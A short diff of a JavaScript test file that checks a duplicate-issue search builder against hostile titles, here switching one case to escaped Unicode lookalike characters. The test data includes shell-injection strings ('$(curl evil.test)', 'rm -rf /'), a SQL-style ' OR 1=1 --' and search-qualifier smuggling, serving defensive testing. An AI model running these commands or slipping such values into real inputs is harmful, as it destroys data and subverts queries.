@@ -388,7 +388,7 @@ describe("duplicateSearchQuery", () => {
     ["crash in:title in:body in:comments"],
     ["created:>2020-01-01 comments:>=5 stars:10..20"],
     ["$(curl evil.test) `id` ; rm -rf / | cat && true"],
-    ["repo​:evil/x ｒｅｐｏ:evil/y repo：evil/z"],
+    ["repo\u200b:evil/x \uff52\uff45\uff50\uff4f:evil/y repo\uff1aevil/z"],
     ["' OR 1=1 -- \\ %22repo:evil/x%22"],
   ])(
     "builds only plain words joined by OR from the hostile title %j",
